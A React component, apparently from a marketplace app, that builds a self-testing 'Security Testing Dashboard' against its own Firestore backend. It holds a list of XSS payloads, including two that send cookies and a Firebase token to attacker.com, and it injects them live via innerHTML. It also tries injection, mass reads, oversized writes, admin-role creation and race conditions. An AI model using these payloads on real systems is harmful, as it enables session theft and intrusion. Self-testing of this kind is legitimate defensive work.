import React, { useState, useEffect } from 'react';
import { collection, addDoc, getDocs, query, where, updateDoc, doc, deleteDoc } from 'firebase/firestore';
import { db } from '../config/firebase';
import { useAuth } from '../hooks/useAuth';
import { logUserAction } from '../services/firebaseService';

interface SecurityTestModalProps {
  onClose: () => void;
}

const SecurityTestModal: React.FC<SecurityTestModalProps> = ({ onClose }) => {
  const { user } = useAuth();
  const [testResults, setTestResults] = useState<string[]>([]);
  const [isRunning, setIsRunning] = useState(false);

  // XSS Payloads to test
  const xssPayloads = [
    '<script>alert("XSS Attack!")</script>',
    '<img src="x" onerror="alert(\'XSS via img\')">',
    'javascript:alert("XSS via javascript:")',
    '<svg onload="alert(\'XSS via SVG\')">',
    '<iframe src="javascript:alert(\'XSS via iframe\')">',
    '"><script>alert("XSS via quote escape")</script>',
    '\';alert("XSS via quote");//',
    '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>',
    '<script>fetch("http://attacker.com/steal", {method: "POST", body: localStorage.getItem("firebase-token")})</script>',
    '<div onclick="alert(\'XSS via onclick\')">Click me</div>',
    '<input onfocus="alert(\'XSS via onfocus\')" autofocus>',
    '<body onload="alert(\'XSS via onload\')">',
    '<marquee onstart="alert(\'XSS via marquee\')">',
    '<style>@import "javascript:alert(\'XSS via CSS\')"</style>',
    '<link rel="stylesheet" href="javascript:alert(\'XSS via link\')">',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS via meta\')">',
    '<object data="javascript:alert(\'XSS via object\')">',
    '<embed src="javascript:alert(\'XSS via embed\')">',
    '<applet code="javascript:alert(\'XSS via applet\')">',
    '<form action="javascript:alert(\'XSS via form\')"><input type="submit"></form>'
  ];

  // Business Logic Attack Payloads
  const businessLogicAttacks = [
    { field: 'price', value: -1000, description: 'Negative price attack' },
    { field: 'price', value: 0, description: 'Zero price attack' },
    { field: 'price', value: 999999999, description: 'Extremely high price attack' },
    { field: 'price', value: 'DROP TABLE items', description: 'SQL injection in price field' },
    { field: 'status', value: 'admin_only', description: 'Unauthorized status attack' },
    { field: 'status', value: 'system', description: 'System status bypass' },
    { field: 'sellerId', value: 'admin', description: 'Admin impersonation attack' },
    { field: 'sellerId', value: 'system', description: 'System impersonation attack' },
    { field: 'isAdmin', value: true, description: 'Admin privilege escalation' },
    { field: 'role', value: 'super_admin', description: 'Role escalation attack' }
  ];

  // NoSQL Injection Payloads
  const noSQLInjectionPayloads = [
    { $ne: null },
    { $gt: '' },
    { $where: 'this.price < 10' },
    { $regex: '.*' },
    "'; DROP COLLECTION items; --",
    { $or: [{ price: { $lt: 1000 } }, { status: 'live' }] }
  ];

  const addTestResult = (result: string) => {
    setTestResults(prev => [...prev, result]);
  };

  const testXSSVulnerabilities = async () => {
    addTestResult('🚨 Testing XSS Vulnerabilities...');
    
    for (let i = 0; i < xssPayloads.length; i++) {
      const payload = xssPayloads[i];
      try {
        // Test storing XSS payload in database
        const docRef = await addDoc(collection(db, 'security_test_items'), {
          title: `XSS Test ${i + 1}`,
          description: payload,
          category: payload,
          brand: payload,
          price: 100,
          sellerId: user?.uid,
          status: 'pending',
          createdAt: new Date(),
          testType: 'xss',
          payloadIndex: i
        });

        addTestResult(`⚠️ XSS Payload ${i + 1} stored successfully - ID: ${docRef.id}`);
        
        // Test if the payload executes when rendered (this is dangerous!)
        const testDiv = document.createElement('div');
        testDiv.innerHTML = payload;
        document.body.appendChild(testDiv);
        
        // Remove the test element immediately
        setTimeout(() => {
          if (testDiv.parentNode) {
            testDiv.parentNode.removeChild(testDiv);
          }
        }, 100);

      } catch (error) {
        addTestResult(`✅ XSS Payload ${i + 1} blocked: ${error}`);
      }
    }
  };

  const testBusinessLogicAttacks = async () => {
    addTestResult('🚨 Testing Business Logic Attacks...');
    
    for (const attack of businessLogicAttacks) {
      try {
        const attackData: any = {
          title: `Business Logic Attack - ${attack.description}`,
          price: 100,
          sellerId: user?.uid,
          status: 'pending',
          createdAt: new Date(),
          testType: 'business_logic'
        };
        
        attackData[attack.field] = attack.value;
        
        const docRef = await addDoc(collection(db, 'security_test_items'), attackData);
        addTestResult(`⚠️ ${attack.description} succeeded - ID: ${docRef.id}`);
      } catch (error) {
        addTestResult(`✅ ${attack.description} blocked: ${error}`);
      }
    }
  };

  const testNoSQLInjection = async () => {
    addTestResult('🚨 Testing NoSQL Injection Attacks...');
    
    for (let i = 0; i < noSQLInjectionPayloads.length; i++) {
      const payload = noSQLInjectionPayloads[i];
      try {
        const docRef = await addDoc(collection(db, 'security_test_items'), {
          title: `NoSQL Injection Test ${i + 1}`,
          price: 100,
          sellerId: user?.uid,
          maliciousField: payload,
          category: payload,
          searchQuery: payload,
          status: 'pending',
          createdAt: new Date(),
          testType: 'nosql_injection'
        });
        
        addTestResult(`⚠️ NoSQL Injection ${i + 1} stored - ID: ${docRef.id}`);
      } catch (error) {
        addTestResult(`✅ NoSQL Injection ${i + 1} blocked: ${error}`);
      }
    }
  };

  const testDataExfiltration = async () => {
    addTestResult('🚨 Testing Data Exfiltration Attacks...');
    
    try {
      // Try to read all items without proper authorization
      const allItemsQuery = query(collection(db, 'items'));
      const snapshot = await getDocs(allItemsQuery);
      
      if (snapshot.size > 100) {
        addTestResult(`⚠️ Data exfiltration possible - Read ${snapshot.size} items`);
      } else {
        addTestResult(`✅ Data exfiltration limited - Only ${snapshot.size} items accessible`);
      }
      
      // Try to read all users
      const allUsersQuery = query(collection(db, 'users'));
      const userSnapshot = await getDocs(allUsersQuery);
      
      if (userSnapshot.size > 0) {
        addTestResult(`⚠️ User data exfiltration possible - Read ${userSnapshot.size} users`);
      } else {
        addTestResult(`✅ User data protected - No users accessible`);
      }
      
    } catch (error) {
      addTestResult(`✅ Data exfiltration blocked: ${error}`);
    }
  };

  const testLargePayloadAttack = async () => {
    addTestResult('🚨 Testing Large Payload DoS Attack...');
    
    try {
      const largeString = 'A'.repeat(1000000); // 1MB string
      const largeArray = new Array(10000).fill('spam');
      
      const docRef = await addDoc(collection(db, 'security_test_items'), {
        title: 'DoS Attack Item',
        price: 100,
        sellerId: user?.uid,
        largeDescription: largeString,
        spamArray: largeArray,
        nestedObject: {
          level1: { level2: { level3: { level4: { data: largeString } } } }
        },
        status: 'pending',
        createdAt: new Date(),
        testType: 'dos_attack'
      });
      
      addTestResult(`⚠️ Large payload DoS attack succeeded - ID: ${docRef.id}`);
    } catch (error) {
      addTestResult(`✅ Large payload DoS attack blocked: ${error}`);
    }
  };

  const testPrivilegeEscalation = async () => {
    addTestResult('🚨 Testing Privilege Escalation Attacks...');
    
    try {
      // Try to create admin user document
      const adminData = {
        email: user?.email,
        isAdmin: true,
        role: 'super_admin',
        permissions: ['all'],
        createdAt: new Date(),
        testType: 'privilege_escalation'
      };
      
      const docRef = await addDoc(collection(db, 'users'), adminData);
      addTestResult(`⚠️ Privilege escalation succeeded - ID: ${docRef.id}`);
    } catch (error) {
      addTestResult(`✅ Privilege escalation blocked: ${error}`);
    }
  };

  const testRaceConditions = async () => {
    addTestResult('🚨 Testing Race Condition Attacks...');
    
    try {
      // Create a test item first
      const itemRef = await addDoc(collection(db, 'security_test_items'), {
        title: 'Race Condition Target',
        price: 1000,
        sellerId: user?.uid,
        status: 'live',
        quantity: 1,
        testType: 'race_condition'
      });
      
      // Try to "purchase" the same item multiple times simultaneously
      const purchaseAttempts = Array(10).fill(null).map(async () => {
        try {
          await updateDoc(doc(db, 'security_test_items', itemRef.id), {
            status: 'sold',
            buyerId: user?.uid,
            soldAt: new Date(),
            soldPrice: 1000
          });
          return 'success';
        } catch (error) {
          return 'failed';
        }
      });
      
      const results = await Promise.all(purchaseAttempts);
      const successCount = results.filter(r => r === 'success').length;
      
      if (successCount > 1) {
        addTestResult(`⚠️ Race condition vulnerability - ${successCount} simultaneous purchases succeeded`);
      } else {
        addTestResult(`✅ Race condition protected - Only ${successCount} purchase succeeded`);
      }
      
    } catch (error) {
      addTestResult(`✅ Race condition test blocked: ${error}`);
    }
  };

  const runAllSecurityTests = async () => {
    if (!user) {
      addTestResult('❌ Must be logged in to run security tests');
      return;
    }
    
    setIsRunning(true);
    setTestResults([]);
    
    addTestResult('🔴 STARTING COMPREHENSIVE SECURITY TESTS');
    addTestResult(`👤 Running as user: ${user.email}`);
    addTestResult('⚠️ WARNING: These tests may attempt to exploit vulnerabilities!');
    addTestResult('');
    
    try {
      await testXSSVulnerabilities();
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      await testBusinessLogicAttacks();
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      await testNoSQLInjection();
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      await testDataExfiltration();
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      await testLargePayloadAttack();
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      await testPrivilegeEscalation();
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      await testRaceConditions();
      
      addTestResult('');
      addTestResult('🔴 SECURITY TESTS COMPLETED');
      addTestResult('📋 Review results above to identify vulnerabilities');
      
      // Log the security test
      if (user) {
        await logUserAction(user, 'security_test', 'Completed comprehensive security testing');
      }
      
    } catch (error) {
      addTestResult(`❌ Security test failed: ${error}`);
    } finally {
      setIsRunning(false);
    }
  };

  const cleanupTestData = async () => {
    try {
      addTestResult('🧹 Cleaning up test data...');
      
      const testItemsQuery = query(
        collection(db, 'security_test_items')
      );
      const snapshot = await getDocs(testItemsQuery);
      
      const deletePromises = snapshot.docs.map(doc => deleteDoc(doc.ref));
      await Promise.all(deletePromises);
      
      addTestResult(`✅ Cleaned up ${snapshot.size} test items`);
    } catch (error) {
      addTestResult(`❌ Cleanup failed: ${error}`);
    }
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
      <div className="bg-white rounded-xl shadow-2xl w-full max-w-4xl max-h-[90vh] overflow-hidden">
        <div className="p-6 border-b border-gray-200">
          <div className="flex justify-between items-start">
            <div>
              <h2 className="text-2xl font-bold text-red-600">🔴 Security Testing Dashboard</h2>
              <p className="text-gray-600 mt-1">Penetration testing for vulnerability assessment</p>
              <div className="text-sm text-red-500 mt-2">
                ⚠️ WARNING: This will attempt to exploit security vulnerabilities in the application
              </div>
            </div>
            <button onClick={onClose} className="text-gray-400 hover:text-gray-600">
              <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>
          </div>
        </div>

        <div className="p-6">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {/* Controls */}
            <div className="space-y-4">
              <h3 className="text-lg font-semibold text-gray-800">Test Controls</h3>
              
              <button
                onClick={runAllSecurityTests}
                disabled={isRunning || !user}
                className="w-full bg-red-500 text-white px-4 py-3 rounded-lg hover:bg-red-600 transition-colors font-medium disabled:bg-gray-300 disabled:cursor-not-allowed"
              >
                {isRunning ? 'Running Tests...' : '🚨 Run All Security Tests'}
              </button>
              
              <button
                onClick={cleanupTestData}
                disabled={isRunning}
                className="w-full bg-blue-500 text-white px-4 py-2 rounded-lg hover:bg-blue-600 transition-colors font-medium disabled:bg-gray-300"
              >
                🧹 Cleanup Test Data
              </button>
              
              {!user && (
                <div className="text-red-500 text-sm">
                  ❌ You must be logged in to run security tests
                </div>
              )}
              
              <div className="text-xs text-gray-500 p-3 bg-gray-50 rounded">
                <strong>Test Categories:</strong>
                <ul className="mt-1 space-y-1">
                  <li>• XSS (Cross-Site Scripting) attacks</li>
                  <li>• Business logic bypass attempts</li>
                  <li>• NoSQL injection attacks</li>
                  <li>• Data exfiltration attempts</li>
                  <li>• DoS (Denial of Service) attacks</li>
                  <li>• Privilege escalation attempts</li>
                  <li>• Race condition exploits</li>
                </ul>
              </div>
            </div>

            {/* Results */}
            <div className="space-y-4">
              <h3 className="text-lg font-semibold text-gray-800">Test Results</h3>
              
              <div className="bg-black text-green-400 p-4 rounded-lg h-96 overflow-y-auto font-mono text-sm">
                {testResults.length === 0 ? (
                  <div className="text-gray-500">No tests run yet. Click "Run All Security Tests" to begin.</div>
                ) : (
                  testResults.map((result, index) => (
                    <div key={index} className="mb-1">
                      {result}
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        </div>

        <div className="bg-gray-50 px-6 py-4 border-t border-gray-200">
          <div className="text-sm text-gray-600">
            <strong>Security Note:</strong> This tool is for authorized penetration testing only. 
            Any vulnerabilities found should be reported and fixed immediately.
          </div>
        </div>
      </div>
    </div>
  );
};

export default SecurityTestModal; 